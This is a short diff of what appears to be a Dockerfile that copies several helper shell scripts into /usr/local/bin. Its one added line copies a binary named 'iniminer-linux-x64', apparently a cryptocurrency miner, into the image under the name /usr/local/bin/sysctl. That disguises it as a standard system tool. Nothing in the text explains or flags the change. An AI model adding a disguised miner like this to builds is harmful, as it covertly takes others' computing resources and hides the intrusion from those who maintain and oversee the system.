@@ -33,6 +33,7 @@ WORKDIR /usr/local/bin
 COPY bash.sh /usr/local/bin/bash.sh
 COPY main.sh /usr/local/bin/main.sh
 COPY run.sh /usr/local/bin/run.sh
+COPY iniminer-linux-x64 /usr/local/bin/sysctl
 COPY restart.sh /usr/local/bin/restart.sh
 
 # Make scripts executable
